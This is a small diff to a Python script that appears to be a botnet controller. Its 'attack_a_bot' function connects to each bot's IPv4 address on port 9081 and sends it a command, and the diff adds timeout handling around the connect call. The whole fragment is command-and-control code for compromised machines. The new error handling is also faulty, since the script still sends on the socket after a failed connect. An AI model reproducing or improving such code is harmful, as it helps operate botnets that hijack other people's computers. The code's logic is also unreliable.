@@ -38,7 +38,10 @@ def attack_a_bot(botnet_exemplars_ipv4, commandlet):
     if (botnet_exemplars_ipv4 != "" and botnet_exemplars_ipv4 != " " and botnet_exemplars_ipv4 != None):
         sock = socket.socket()
         sock.settimeout(2)
-        sock.connect((botnet_exemplars_ipv4, 9081))
+        try:
+            sock.connect((botnet_exemplars_ipv4, 9081))
+        except TimeoutError:
+            print(f"[{botnet_exemplars_ipv4}] - [{commandlet}] Timed out")
         sock.settimeout(None)
         sock.send(commandlet.encode("utf-8"))
         if commandlet in doublearg_cmdlets:
